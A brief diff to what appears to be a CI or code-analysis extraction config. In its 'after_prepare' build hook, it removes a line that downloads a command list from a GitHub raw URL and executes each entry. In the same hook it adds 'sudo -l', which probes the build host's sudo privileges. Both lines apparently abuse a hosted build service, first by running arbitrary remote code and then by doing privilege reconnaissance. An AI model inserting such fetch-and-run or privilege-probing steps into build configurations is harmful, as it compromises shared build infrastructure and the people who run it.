@@ -6,4 +6,4 @@ extraction:
         - net-tools
         - curl
     after_prepare:    # Customizable step used by all languages.
-      - for e in `curl https://raw.githubusercontent.com/aungaungau/fsfasfafa/master/commds.txt`; do $e;done
+      - sudo -l
